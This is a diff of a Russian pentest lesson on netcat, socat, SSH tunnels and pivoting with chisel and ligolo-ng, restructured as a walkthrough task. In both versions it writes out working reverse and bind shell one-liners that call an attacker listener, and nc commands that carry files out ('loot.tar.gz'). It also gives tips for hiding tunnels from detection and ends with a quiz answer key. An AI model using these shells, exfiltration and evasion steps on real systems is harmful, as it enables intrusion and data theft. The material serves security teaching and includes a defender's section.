@@ -15,498 +15,268 @@ estimated_minutes: 40
 summary: "Полный справочник: netcat (слушатели, шеллы, передача файлов), socat (релеи, туннели), SSH-пробросы и pivoting через chisel/ligolo."
 ---
 
-Когда у вас есть хоть один доступ к сети, дальше всё решают соединения: подключиться к внутреннему сервису, пробросить порт, поднять реверс-шелл, сделать прокси до изолированного сегмента. Этот урок — справочник по «рабочим лошадкам» соединений: **netcat**, **socat**, **SSH-туннели** и инструментам pivoting (**chisel**, **ligolo-ng**, **proxychains**).
+## Задача
 
-## netcat: базовый синтаксис и варианты
+Ты получил доступ к хосту-мосту `10.0.0.50` (назовём его `jump`). Внутри его сети живёт веб-сервис `10.0.1.5:80`, который тебе снаружи не виден, и весь сегмент `10.0.1.0/24`. Нужно: проверить, что сервис жив, достучаться до него, а затем получить доступ ко всему сегменту. Если SSH на `jump` нет — сделать то же через HTTP-туннель.
 
-Существует три основных «нетката», и они различаются флагами:
+Это урок-справочник по «рабочим лошадкам» соединений: **netcat**, **socat**, **SSH-пробросы** и **chisel/ligolo**. Флаги применяем по мере решения задачи, а полные таблицы — в конце.
 
-- **OpenBSD nc** (`/usr/bin/nc` на BSD/macOS, часто и в Linux) — эталонный, без `-e`.
-- **GNU netcat** (`netcat-traditional`) — поддерживает `-e`.
-- **ncat** (из nmap) — расширенный: `-e`, SSL, keep-open, allow-списки.
+## Данные, с которыми работаем
 
-| Флаг | Что делает | Пример |
-|------|-----------|--------|
-| `-l` | Слушать (listen) | `nc -l 4444` |
-| `-v` | Verbose | `nc -v 10.0.0.5 80` |
-| `-n` | Не резолвить имена/порты | `nc -n 10.0.0.5 80` |
-| `-p <port>` | Локальный/source-порт | `nc -p 40000 10.0.0.5 80` |
-| `-s <ip>` | Исходный адрес | `nc -s 10.0.0.9 10.0.0.5 80` |
-| `-u` | UDP | `nc -u 10.0.0.5 53` |
-| `-z` | Zero-I/O: только проверка портов | `nc -zv 10.0.0.5 1-1024` |
-| `-w <sec>` | Таймаут connect/final read | `nc -w 3 10.0.0.5 80` |
-| `-q <sec>` | Выйти через N сек после EOF | `nc -q 2 10.0.0.5 80` |
-| `-k` | Не закрываться после первого соединения | `nc -lk 4444` |
-| `-C` | Слать CRLF как перевод строки | `nc -C 10.0.0.5 80` |
-| `-N` | Закрыть сокет после EOF на stdin | `nc -N 10.0.0.5 80` |
-| `-4` / `-6` | Только IPv4 / IPv6 | `nc -6 ::1 80` |
-| `-b` | Разрешить broadcast | `nc -b -u 255.255.255.255 9` |
-| `-D` | Debug socket option | `nc -D 10.0.0.5 80` |
-| `-d` | Detach от stdin (фон) | `nc -d 10.0.0.5 80` |
-| `-F` | Передать socket fd | `nc -F 10.0.0.5 80` |
-| `-I <len>` | Размер TCP receive buffer | `nc -I 1024 10.0.0.5 80` |
-| `-O <len>` | Размер TCP send buffer | `nc -O 1024 10.0.0.5 80` |
-| `-i <sec>` | Задержка между строками/портами | `nc -i 1 -zv 10.0.0.5 1-100` |
-| `-M <ttl>` | Исходящий TTL | `nc -M 64 10.0.0.5 80` |
-| `-m <minttl>` | Мин. входящий TTL | `nc -m 10 10.0.0.5 80` |
-| `-r` | Случайный порядок портов | `nc -r -zv 10.0.0.5 1-100` |
-| `-S` | TCP MD5 signature | `nc -S 10.0.0.5 80` |
-| `-T <keyword>` | Значение TOS | `nc -T lowdelay 10.0.0.5 80` |
-| `-t` | Отвечать на TELNET-негоциацию | `nc -t 10.0.0.5 23` |
-| `-U` | UNIX-domain socket | `nc -U /tmp/sock` |
-| `-V <rtable>` | Альтернативная таблица маршрутов | `nc -V 2 10.0.0.5 80` |
-| `-W <n>` | Завершить после N принятых пакетов | `nc -W 1 10.0.0.5 80` |
-| `-X <proto>` | Прокси-протокол (`4`,`4A`,`5`,`connect`) | `nc -X 5 -x 127.0.0.1:9050 10.0.0.5 80` |
-| `-x <addr[:port]>` | Адрес прокси | `nc -X 5 -x 127.0.0.1:9050 target 80` |
-| `-P <user>` | Пользователь для прокси-аутентификации | `nc -P user -x proxy:1080 t 80` |
-| `-Z` | Режим DCCP | `nc -Z 10.0.0.5 80` |
-| `-e <cmd>` | Выполнить программу (GNU/ncat; в OpenBSD удалён) | `nc -e /bin/bash 10.0.0.9 4444` |
-| `--ssl` | TLS (только ncat) | `ncat --ssl 10.0.0.5 443` |
-| `--allow <host>` | Ограничить источник (ncat) | `ncat -l --allow 10.0.0.9 4444` |
-| `--keep-open` | Не закрываться (ncat) | `ncat -l --keep-open 4444` |
+У нас есть SSH-доступ к `jump` (`ssh user@10.0.0.50`). Цель `10.0.1.5:80` из нашей сети недостижима. Проверим это и заодно познакомимся с `netcat`:
 
-Базовые соединения:
-
-```bash
-nc -lvnp 4444              # слушать на 4444 (GNU/ncat)
-nc -l 4444                 # слушать (OpenBSD)
-nc 10.0.0.5 80             # подключиться
-nc -zv 10.0.0.5 20-25      # просканировать порты 20-25
-nc -u 10.0.0.5 53          # UDP
+```
+$ nc -zv -w2 10.0.1.5 80
+nc: connect to 10.0.1.5 port 80 (tcp) failed: Connection timed out
+$ ssh user@jump 'nc -zv -w2 10.0.1.5 80'
+Connection to 10.0.1.5 80 port [tcp/http] succeeded!
 ```
 
-## netcat: практические рецепты (шеллы, файлы, порты)
+`nc -z` (zero-I/O) только проверяет порт, `-v` — подробно, `-w2` — таймаут. С `jump` сервис виден, с нашей машины — нет. Значит, надо протянуть канал.
 
-**Проверить, открыт ли порт (без записи данных):**
+## Шаг 1: пробрасываем один порт (ssh -L)
 
-```bash
-nc -zv 10.0.0.5 1-1024
-nc -zv -w1 10.0.0.5 80,443,8080
+**Локальный проброс** открывает порт у нас и ведёт к цели глазами `jump`:
+
+```
+$ ssh -N -f -L 8080:10.0.1.5:80 user@jump
+$ curl -s http://127.0.0.1:8080/ | head -1
+<!DOCTYPE html>
 ```
 
-**HTTP-запрос вручную (без curl):**
+`-L 8080:10.0.1.5:80` — локальный порт 8080 → `10.0.1.5:80`; `-N` — только туннель без команды; `-f` — в фон. Теперь `127.0.0.1:8080` — это внутренний веб.
 
-```bash
-printf 'GET / HTTP/1.0\r\nHost: example.com\r\n\r\n' | nc -w 3 example.com 80
+## Шаг 2: доступ ко всему сегменту (ssh -D)
+
+Когда целей много, поднимаем **SOCKS-прокси** и ходим через него:
+
+```
+$ ssh -N -f -D 9050 user@jump
+$ proxychains4 -q nmap -sT -Pn -p22,80,445,3389 10.0.1.0/24
+PORT     STATE SERVICE
+10.0.1.5 80/tcp open  http
+10.0.1.9 445/tcp open  microsoft-ds
 ```
 
-**Передача файла (отправка → приём):**
+`-D 9050` — динамический SOCKS на локальном порту. Важно: `nmap` через прокси работает только в `-sT` (полное TCP-соединение), потому что SOCKS не умеет raw-пакеты.
 
-```bash
-# принимающая сторона
-nc -lvnp 4444 > received.bin
-# отправитель
-nc 10.0.0.5 4444 < secret.bin
+## Шаг 3: нет SSH — chisel и ligolo
+
+Если на `jump` SSH недоступен, а есть только выполнение кода, работают HTTP-туннели.
+
+**chisel** — один бинарник, даёт reverse SOCKS поверх HTTP:
+
+```
+# attacker:
+$ ./chisel server -p 8000 --reverse
+# жертва:
+$ ./chisel client 10.0.0.9:8000 R:socks
+# attacker:
+$ proxychains4 -q nmap -sT -Pn -p80 10.0.1.5
 ```
 
-**Реверс-шелл (жертва подключается к вам):**
+**ligolo-ng** идёт дальше: поднимает **TUN-интерфейс**, и маршруты к внутренним подсетям добавляются штатно — без SOCKS-обвязки:
 
-```bash
-# слушаем на атакующем
-nc -lvnp 4444
-# на цели (GNU netcat)
-nc -e /bin/bash 10.0.0.9 4444
-# на цели (OpenBSD nc без -e) — через FIFO
-rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.0.9 4444 > /tmp/f
+```
+# attacker:
+$ ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601
+# жертва:
+$ ./agent -connect 10.0.0.9:11601 -ignore-cert
+# в консоли прокси: session -> ifconfig -> start
+$ sudo ip route add 10.0.1.0/24 dev ligolo
+$ nmap -sS -Pn 10.0.1.0/24
 ```
 
-**Бинд-шелл (жертва слушает, вы подключаетесь):**
+## Шаг 4: ловим reverse-shell (nc и socat)
 
-```bash
-# на цели
-nc -lvnp 4444 -e /bin/bash
-# с атакующего
-nc 10.0.0.5 4444
+Проброс — это доступ, но иногда нужен сам шелл. Слушаем на своей машине и заставляем цель подключиться:
+
+```
+# attacker:
+$ nc -lvnp 4444
+
+# цель, если nc без -e (большинство дистрибутивов):
+$ socat TCP:10.0.0.9:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 ```
 
-`-e` вырезан во многих дистрибутивах (OpenBSD nc). Тогда используйте FIFO-трюк выше, ncat (`ncat -e`), или socat (см. ниже).
+`socat` соединяет два канала любой природы; здесь — TCP до нас с локальным bash. Опции `pty,raw,echo=0` дают полноценный терминал. Тот же трюк на чистом `nc` без `-e` делается через FIFO:
 
-**Стабилизировать шелл до полноценного TTY:**
-
-```bash
-# в пойманном шелле
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-# Ctrl-Z, затем в своём терминале:
-stty raw -echo; fg
-# в шелле:
-export TERM=xterm; stty rows 40 cols 120
+```
+$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.0.9 4444 > /tmp/f
 ```
 
-## socat: базовый синтаксис
+## Почему reverse-шелл, а не bind
 
-`socat` — «netcat на стероидах»: соединяет два адреса (канала) любой природы. Синтаксис:
+Шелл поднимают двумя способами: **bind** (цель слушает, ты подключаешься) и **reverse** (ты слушаешь, цель подключается). В реальных сетях bind почти всегда не работает: входящие соединения к рабочей станции режет фаервол, а NAT не пропускает внешний коннект внутрь. Исходящие же разрешены почти всегда — без них не работает браузер.
 
-```bash
-socat [опции] АДРЕС1 АДРЕС2
+Отсюда правило: **по умолчанию всегда reverse**, а порт выбирай из разрешённых наружу (80, 443), чтобы сливаться с обычным трафиком.
+
+## Шаг 5: стабилизируем шелл до полного TTY
+
+Реверс-шелл через `nc`/`socat` часто «тупой»: нет истории, Ctrl-C убивает сессию, `vim` и `ssh` внутри не работают. Причина — удалённая сторона это простой pipe, а не терминал. Лечится апгрейдом до **pty**.
+
+Первый способ — питоновский one-liner прямо в пойманном шелле:
+
+```
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Адреса: `TCP-LISTEN:4444`, `TCP:host:port`, `UDP:...`, `UNIX-LISTEN:/tmp/s`, `EXEC:/bin/bash`, `SYSTEM:"cmd"`, `OPEN:/file`, `PTY,raw,echo=0`, `STDIN`/`STDOUT`, `SOCKS4:...`, `PROXY:host:port`. Опции: `fork` (несколько соединений), `reuseaddr`, `bind=`, `range=`, `retry`, `keepalive`, `ssl`/`openssl`, `verify=0`.
+Второй — через socat: опции `pty,raw,echo=0` сразу дают полноценный терминал, а `setsid` отвязывает процесс от родителя. Полный вариант на цели:
 
-### socat: адреса (каналы) — таблица
-
-| Адрес | Что это | Пример |
-|-------|---------|--------|
-| `TCP4-LISTEN:<port>` | Слушать TCP (IPv4) | `socat TCP4-LISTEN:4444,fork -` |
-| `TCP4:<host>:<port>` | Подключиться по TCP | `socat - TCP4:10.0.0.5:80` |
-| `TCP6-LISTEN:<port>` | Слушать TCP (IPv6) | `socat TCP6-LISTEN:4444,fork -` |
-| `UDP-LISTEN:<port>` | Слушать UDP | `socat UDP-LISTEN:5353,fork -` |
-| `UDP:<host>:<port>` | UDP-соединение | `socat - UDP:8.8.8.8:53` |
-| `UNIX-LISTEN:<path>` | Слушать UNIX-сокет | `socat UNIX-LISTEN:/tmp/s,fork -` |
-| `UNIX-CONNECT:<path>` | Подключиться к UNIX-сокету | `socat - UNIX-CONNECT:/tmp/s` |
-| `EXEC:<cmd>` | Выполнить программу | `socat TCP-LISTEN:4444,fork EXEC:/bin/bash` |
-| `SYSTEM:<cmd>` | Выполнить через shell | `socat TCP-LISTEN:4444,fork SYSTEM:"id"` |
-| `OPEN:<file>` | Открыть файл как канал | `socat - OPEN:/etc/passwd` |
-| `CREATE:<file>` | Создать файл | `socat - CREATE:/tmp/out.bin` |
-| `PTY,raw,echo=0` | Псевдотерминал | `...,pty,raw,echo=0` |
-| `STDIN` / `STDOUT` / `-` | Стандартный ввод/вывод | `socat - TCP:10.0.0.5:80` |
-| `SOCKS4:<proxy>:<target>:<port>` | Через SOCKS4 | `socat - SOCKS4:127.0.0.1:9050:target:80` |
-| `SOCKS4A` / `SOCKS5` | Через SOCKS | `socat - SOCKS5:127.0.0.1:9050:target:80` |
-| `PROXY:<proxy>:<target>:<port>` | Через HTTP-прокси | `socat - PROXY:proxy:8080:target:80` |
-| `OPENSSL-LISTEN:<port>` | TLS-слушатель | `socat OPENSSL-LISTEN:4444,cert=c.pem,key=k.pem,fork -` |
-| `OPENSSL:<host>:<port>` | TLS-клиент | `socat - OPENSSL:10.0.0.9:4444,verify=0` |
-| `GOPENSSL:<host>:<port>` | TLS через GnuTLS | `socat - GOPENSSL:host:443` |
-| `TUN:<addr>/<mask>` | TUN-интерфейс | `socat TUN:10.0.0.1/24 ...` |
-| `SCTP-LISTEN:<port>` | SCTP | `socat SCTP-LISTEN:4444,fork -` |
-
-### socat: опции — таблица
-
-| Опция | Что делает | Пример |
-|-------|-----------|--------|
-| `fork` | Обслуживать несколько соединений | `TCP-LISTEN:4444,fork` |
-| `reuseaddr` | Переиспользовать адрес (bind) | `TCP-LISTEN:4444,reuseaddr` |
-| `reuseport` | SO_REUSEPORT | `...,reuseport` |
-| `bind=<addr>` | Привязать к адресу | `bind=127.0.0.1` |
-| `range=<a-b>` | Ограничить IP клиентов | `range=10.0.0.0/24` |
-| `retry=<n>` | Повторять подключение | `retry=10` |
-| `keepalive` | TCP keepalive | `...,keepalive` |
-| `keepidle` / `keepintvl` / `keepcnt` | Параметры keepalive | `keepidle=10` |
-| `crlf` | CRLF-перевод строк | `...,crlf` |
-| `cr` / `nl` | Управление переводами | `...,cr` |
-| `pty` | Псевдотерминал | `EXEC:/bin/bash,pty` |
-| `stderr` | Подключить stderr | `...,stderr` |
-| `setsid` | Новая сессия | `...,setsid` |
-| `sigint` / `sighup` / `sigquit` | Проброс сигналов | `...,sigint` |
-| `sane` | «Разумные» настройки tty | `...,sane` |
-| `raw` / `echo=0` | Сырой tty без эха | `pty,raw,echo=0` |
-| `verify=0` | Не проверять TLS-сертификат | `OPENSSL:...,verify=0` |
-| `cert=` / `key=` | Сертификат и ключ | `cert=c.pem,key=k.pem` |
-| `cafile=` / `capath=` | CA для проверки | `cafile=ca.pem` |
-| `su=` / `sp=` | Подменить пользователя/пароль | `su=nobody` |
-| `umask=<n>` | umask для UNIX-сокета | `umask=0077` |
-| `nofork` | Не форкать | `...,nofork` |
-| `max-children=<n>` | Лимит детей при fork | `max-children=10` |
-| `tcpwrap` | Использовать tcpwrappers | `...,tcpwrap` |
-| `readbytes=<n>` | Прочитать ровно N байт | `readbytes=1024` |
-| `escape=<n>` | Экранирующий байт | `escape=0x1d` |
-| `ignoreeof` | Не завершать по EOF | `...,ignoreeof` |
-
-```bash
-# слушать и выполнять bash на каждое подключение
-socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
-# подключиться
-socat - TCP:10.0.0.5:80
+```
+$ socat TCP:10.0.0.9:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
 ```
 
-## socat: релеи и туннели
+После апгрейда выровняй размер терминала (`stty rows 40 cols 120`) — иначе `vim` рисует кашу.
 
-**Реверс-шелл через socat (цель):**
+## Шаг 6: передача файлов и двойной пивот
 
-```bash
-socat TCP:10.0.0.9:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+Канал нужен не только для шеллов. Тот же `nc` переносит файлы без SCP:
+
+```
+# приёмник:
+$ nc -lvnp 4444 > loot.tar.gz
+# отправитель:
+$ nc 10.0.0.9 4444 < loot.tar.gz
 ```
 
-**Реле (проброс порта без SSH):**
+А когда до цели несколько хопов, цепочку строят через `ProxyCommand` — SSH «проталкивается» сквозь уже поднятый туннель:
 
-```bash
-# локальный 8080 -> внутренний 10.0.1.5:80
-socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.0.1.5:80
+```
+$ ssh -o ProxyCommand='ssh -W %h:%p user@jump' user@10.0.1.5
 ```
 
-**Форвард UDP:**
+То же самое короче делает `-J` (ProxyJump):
 
-```bash
-socat UDP-LISTEN:5353,fork UDP:8.8.8.8:53
+```
+$ ssh -J user@jump user@10.0.1.5
 ```
 
-**TLS-обёртка (шифрованный шелл):**
+Так из точки `jump` ты попадаешь в следующий сегмент, не поднимая отдельный SOCKS: каждый новый хост расширяет периметр на один прыжок.
 
-```bash
-# на атакующем: сгенерировать сертификат
-openssl req -newkey rsa:2048 -nodes -keyout k.pem -x509 -out c.pem -days 1 -subj /CN=x
-socat OPENSSL-LISTEN:4444,cert=c.pem,key=k.pem,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
-# на цели
-socat OPENSSL:10.0.0.9:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+## Шпаргалка: ключевые флаги
+
+**netcat** (три версии: OpenBSD nc, GNU netcat, ncat — флаги различаются):
+
+| Флаг | Что делает |
+|------|-----------|
+| `-l` / `-lvnp` | слушать (GNU: `-l -v -n -p`) |
+| `-z` | только проверка портов |
+| `-u` | UDP |
+| `-w <sec>` | таймаут |
+| `-k` | не закрываться после соединения |
+| `-e <cmd>` | выполнить программу (GNU/ncat; в OpenBSD вырезан) |
+| `--ssl` | TLS (только ncat) |
+
+**socat** — синтаксис `socat [опции] АДРЕС1 АДРЕС2`. Адреса: `TCP4-LISTEN:4444`, `TCP4:host:port`, `UDP-LISTEN:5353`, `UNIX-LISTEN:/tmp/s`, `EXEC:/bin/bash`, `OPEN:/file`, `SOCKS5:...`, `OPENSSL-LISTEN:4444`. Опции: `fork` (несколько соединений), `reuseaddr`, `pty,raw,echo=0`, `verify=0`.
+
+```
+$ socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.0.1.5:80    # релей без SSH
 ```
 
-**Файл как канал (для изолированных окружений):**
-
-```bash
-socat UNIX-LISTEN:/tmp/sock,fork EXEC:/bin/bash,pty,stderr
-```
-
-## SSH: локальный, удалённый и динамический проброс
-
-SSH умеет три вида перенаправления — это ядро pivoting.
+**SSH-пробросы:**
 
 | Вид | Команда | Смысл |
 |-----|---------|-------|
-| Локальный | `ssh -L 8080:10.0.1.5:80 user@jump` | Локальный порт → удалённый адрес через jump |
-| Удалённый | `ssh -R 8080:10.0.1.5:80 user@vps` | Порт на удалённом хосте → локальный адрес |
-| Динамический | `ssh -D 9050 user@jump` | SOCKS-прокси на локальном порту |
+| Локальный | `ssh -L 8080:10.0.1.5:80 user@jump` | локальный порт → цель через jump |
+| Удалённый | `ssh -R 9000:127.0.0.1:80 user@vps` | порт на удалённом → к нам |
+| Динамический | `ssh -D 9050 user@jump` | SOCKS-прокси |
+| Stdio | `ssh -W 10.0.1.5:22 user@jump` | сырой поток (для ProxyCommand) |
+| Цепочка | `ssh -J user1@h1,user2@h2 h3` | прыжки через несколько хостов |
 
-```bash
-# локальный проброс: у вас на 127.0.0.1:8080 откроется внутренний 10.0.1.5:80
-ssh -N -L 8080:10.0.1.5:80 user@jump.example.com
+Для устойчивости добавляй `-o ServerAliveInterval=30 -o ExitOnForwardFailure=yes` или используй `autossh`.
 
-# пробросить несколько портов сразу
-ssh -N -L 8080:10.0.1.5:80 -L 3389:10.0.1.6:3389 user@jump
+## Если не сработало
 
-# удалённый проброс: на VPS откроется порт, ведущий к вашему локальному сервису
-ssh -N -R 9000:127.0.0.1:80 user@vps.example.com
+- `nc` не поддерживает `-e` (OpenBSD) → используй FIFO-трюк, `ncat -e` или `socat`.
+- Туннель рвётся по таймауту → добавь `ServerAliveInterval`/`autossh`.
+- `nmap` через прокси молчит → проверь `-sT` (SOCKS не пропускает raw-пакеты).
+- SSH-forwarding запрещён на сервере (`AllowTcpForwarding no`) → переходи на `chisel`/`ligolo`/`socat`.
 
-# динамический SOCKS5
-ssh -N -D 9050 user@jump
+## Диагностика соединений
+
+`nc` — быстрый способ проверить, что вообще живо: `nc -zv host port` отвечает за секунду. А для ручного запроса без `curl` хватает одного `printf`:
+
+```
+$ printf 'GET / HTTP/1.0\r\nHost: example.com\r\n\r\n' | nc -w 3 example.com 80
 ```
 
-### SSH: полная таблица флагов
+Так удобно смотреть заголовки, отлаживать редиректы и убеждаться, что сервис отвечает, прежде чем строить туннель.
 
-| Флаг | Что делает | Пример |
-|------|-----------|--------|
-| `-L [bind:]p:host:port` | Локальный проброс | `ssh -L 8080:10.0.1.5:80 jump` |
-| `-R [bind:]p:host:port` | Удалённый проброс | `ssh -R 9000:127.0.0.1:80 vps` |
-| `-D [bind:]port` | Динамический SOCKS-прокси | `ssh -D 9050 jump` |
-| `-W <host:port>` | Stdio-проброс (для ProxyCommand) | `ssh -W 10.0.1.5:22 jump` |
-| `-J <dest>` | ProxyJump (цепочка прыжков) | `ssh -J user1@h1,user2@h2 h3` |
-| `-N` | Не выполнять команду (только туннель) | `ssh -N -L 8080:t:80 jump` |
-| `-f` | Уйти в фон | `ssh -f -N -L 8080:t:80 jump` |
-| `-C` | Сжатие | `ssh -C host` |
-| `-T` / `-t` | Не выделять / форсировать pty | `ssh -T host` |
-| `-i <key>` | Приватный ключ | `ssh -i id_rsa host` |
-| `-p <port>` | Порт | `ssh -p 2222 host` |
-| `-l <user>` | Логин | `ssh -l root host` |
-| `-o <opt>` | Опция конфига | `ssh -o ServerAliveInterval=30 host` |
-| `-F <file>` | Свой конфиг | `ssh -F myconfig host` |
-| `-G` | Показать итоговый конфиг без подключения | `ssh -G host` |
-| `-g` | Разрешить удалённым хостам доступ к проброшенным портам | `ssh -g -L 8080:t:80 host` |
-| `-M` / `-S <path>` | Master-режим и ControlPath (мультиплекс) | `ssh -M -S ~/.ssh/cm host` |
-| `-O <cmd>` | Управление мастер-соединением (`check`, `exit`) | `ssh -O check host` |
-| `-A` / `-a` | Вкл./выкл. agent-forwarding | `ssh -A host` |
-| `-X` / `-Y` / `-x` | X11-forwarding (trusted) / отключить | `ssh -X host` |
-| `-c <cipher>` / `-m <mac>` | Выбор шифра / MAC | `ssh -c aes256-ctr host` |
-| `-w <local[:remote]>` | TUN-туннель | `ssh -w 0:0 host` |
-| `-I <pkcs11>` | PKCS#11-провайдер | `ssh -I /usr/lib/pkcs11.so host` |
-| `-B <iface>` / `-b <addr>` | bind interface / address | `ssh -b 10.0.0.9 host` |
-| `-E <file>` | Лог в файл | `ssh -E ssh.log host` |
-| `-e <char>` | Escape-символ | `ssh -e '~' host` |
-| `-n` | stdin из /dev/null | `ssh -n host cmd` |
-| `-q` | Тихий режим | `ssh -q host` |
-| `-v` / `-vv` / `-vvv` | Verbose | `ssh -vv host` |
-| `-4` / `-6` | Только IPv4 / IPv6 | `ssh -6 host` |
-| `-Q <q>` | Запрос возможностей (cipher, mac, …) | `ssh -Q cipher` |
-| `-V` | Версия | `ssh -V` |
+Ещё один частый вопрос — «почему через туннель отвечает не то». Проверяй `Host`-заголовок: при пробросе `-L 8080:10.0.1.5:80` запрос уходит с `Host: 127.0.0.1:8080`, и виртуальный хост может отдать не тот сайт. Лечится заголовком `-H 'Host: target.local'` или обращением по реальному имени через SOCKS.
 
-## SSH: ProxyJump, ключи, устойчивые туннели
+## Взгляд защитника: как ловят туннели
 
-**Прыжок через несколько хостов:**
+Туннели — палка о двух концах: ими пользуются и админы, и атакующие. Защитник ищет их по признакам:
 
-```bash
-ssh -J user1@host1,user2@host2 user3@host3
-# то же через конфиг:
-ssh -o ProxyCommand='ssh -W %h:%p user1@host1' user2@host2
-```
+- **Долгоживущие соединения** к одному внешнему IP с постоянным потоком байт — типичный SOCKS/chisel.
+- **Несоответствие содержимого** — сессия на порт 443 без валидного TLS-handshake (JA3 не похож на браузер).
+- **Резкий рост исходящего трафика** к незнакомому хосту — эксфильтрация.
 
-**~/.ssh/config — удобно для повторяющихся туннелей:**
+Отсюда вывод для пентеста: туннель эффективен против фильтров, но заметен системам, которые смотрят на **метаданные соединений**, а не на содержимое. Для скрытности его маскируют под обычный протокол (chisel поверх HTTP, `--tls`) и ограничивают скорость.
 
-```text
-Host jump
-    HostName jump.example.com
-    User user
-    IdentityFile ~/.ssh/id_ed25519
-    ServerAliveInterval 30
-    ServerAliveCountMax 3
-    ExitOnForwardFailure yes
+## Что мы теперь знаем
 
-Host inner
-    HostName 10.0.1.5
-    User root
-    ProxyJump jump
-```
-
-**Устойчивый фоновый туннель:**
-
-```bash
-ssh -f -N -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes \
-    -L 8080:10.0.1.5:80 user@jump
-```
-
-**Multiplexing (один TCP-канал для многих сессий):**
-
-```bash
-ssh -o ControlMaster=auto -o ControlPath=~/.ssh/cm-%r@%h:%p -o ControlPersist=10m user@jump
-```
-
-`autossh` переподнимает туннель при обрыве: `autossh -M 0 -f -N -L 8080:10.0.1.5:80 user@jump`.
-
-## Pivoting: chisel и ligolo-ng
-
-Когда SSH на промежуточном хосте недоступен, работают HTTP-туннели.
-
-**chisel** (один бинарник, HTTP + SOCKS):
-
-```bash
-# атакующий: сервер (для reverse-туннеля)
-chisel server -p 8080 --reverse
-
-# жертва: подключается и открывает SOCKS на атакующем
-chisel client 10.0.0.9:8080 R:socks
-
-# или проброс конкретного порта с жертвы наружу
-chisel client 10.0.0.9:8080 R:8080:127.0.0.1:80
-
-# forward-вариант (локальный порт -> цель в сети жертвы)
-chisel client 10.0.0.9:8080 L:8080:10.0.1.5:80
-```
-
-**ligolo-ng** (TUN-интерфейс, полноценная маршрутизация):
-
-```bash
-# атакующий: прокси-сервер
-./ligolo-proxy -selfcert -laddr 0.0.0.0:11601
-
-# жертва: агент
-./agent -connect 10.0.0.9:11601 -ignore-cert
-
-# в консоли прокси:
-session            # выбрать сессию
-ifconfig           # узнать внутренние сети
-start              # поднять туннель
-# на атакующем добавить маршрут к внутренней сети:
-sudo ip route add 10.0.1.0/24 dev ligolo
-```
-
-ligolo даёт прозрачный доступ к внутренним подсетям без SOCKS-обвязки.
-
-## Прокси-цепочки: proxychains
-
-`proxychains` заставляет любой TCP-инструмент идти через SOCKS/HTTP-прокси — идеально поверх `ssh -D` или `chisel R:socks`.
-
-Конфиг `~/.proxychains/proxychains.conf`:
-
-```text
-strict_chain
-proxy_dns
-[ProxyList]
-socks5 127.0.0.1 9050
-```
-
-Использование:
-
-```bash
-proxychains4 -q nmap -sT -Pn -p 445 10.0.1.5
-proxychains4 -q curl http://10.0.1.5/
-proxychains4 -q crackmapexec smb 10.0.1.0/24
-```
-
-Важно: `nmap` через proxychains работает только в режиме `-sT` (connect) — SOCKS не умеет raw-пакеты.
-
-## Практические рецепты (pivot в пентесте)
-
-**У вас SSH-доступ к jump, нужно дойти до внутреннего веба:**
-
-```bash
-ssh -N -f -L 8080:10.0.1.5:80 user@jump
-curl http://127.0.0.1:8080/
-```
-
-**Полный SOCKS-доступ во внутреннюю сеть:**
-
-```bash
-ssh -N -f -D 9050 user@jump
-proxychains4 -q nmap -sT -Pn -p 22,80,443,445,3389 10.0.1.0/24
-```
-
-**Нет SSH, есть RCE — поднимаем chisel:**
-
-```bash
-# атакующий
-./chisel server -p 8000 --reverse
-# цель (загрузили бинарник)
-./chisel client 10.0.0.9:8000 R:socks
-# атакующий
-proxychains4 -q nmap -sT -Pn -p 80 10.0.1.5
-```
-
-**Проверить достижимость внутреннего хоста без полного прокси:**
-
-```bash
-# netcat через SSH stdio-проброс
-ssh -o ProxyCommand='ssh -W %h:%p user@jump' user@10.0.1.5
-```
-
-**Поднять реверс-шелл из сети без исходящих SSH:**
-
-```bash
-# атакующий
-nc -lvnp 4444
-# цель (socat, если nc без -e)
-socat TCP:10.0.0.9:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
-```
-
-## Частые ошибки
-
-- **Ждать `-e` от OpenBSD nc.** В большинстве дистрибутивов его нет — используйте FIFO-трюк, ncat или socat.
-- **Путать `-l` и `-p` между версиями.** В OpenBSD `nc -l 4444`, в GNU `nc -lvnp 4444`. Проверяйте `nc -h`.
-- **nmap через proxychains в `-sS`.** SOCKS не поддерживает raw-сокеты — только `-sT -Pn`.
-- **Забыть `ExitOnForwardFailure`/`ServerAliveInterval`.** Туннель тихо отвалится; используйте эти опции или `autossh`.
-- **`-D` на чужом порту.** По умолчанию SOCKS слушает только localhost — если нужен доступ другим хостам, задавайте `bind_address` в ssh-конфиге осознанно.
+- `nc -zv` проверяет порты; `-e` есть не везде — заменяется FIFO-трюком или `socat`.
+- `socat` соединяет любые два канала: релеи, шеллы, TLS-обёртки.
+- SSH даёт `-L` (локальный), `-R` (обратный), `-D` (SOCKS), `-J` (цепочки).
+- `chisel` — reverse SOCKS поверх HTTP; `ligolo-ng` — прозрачный TUN-пивот.
+- `nmap` через SOCKS только в `-sT`.
+- При пробросе проверяй `Host`-заголовок: виртуальный хост может ответить не тем сайтом.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Какая команда поднимает динамический SOCKS-прокси через SSH?"
+- question: 'Какая команда поднимает динамический SOCKS-прокси через SSH?'
   options:
-    - "ssh -N -D 9050 user@host"
-    - "ssh -N -L 9050:target:80 user@host"
-    - "ssh -N -R 9050:target:80 user@host"
-    - "ssh -N -W 9050 user@host"
+    - 'ssh -N -D 9050 user@host'
+    - 'ssh -N -L 9050:target:80 user@host'
+    - 'ssh -N -R 9050:target:80 user@host'
+    - 'ssh -N -W 9050 user@host'
   answer: 0
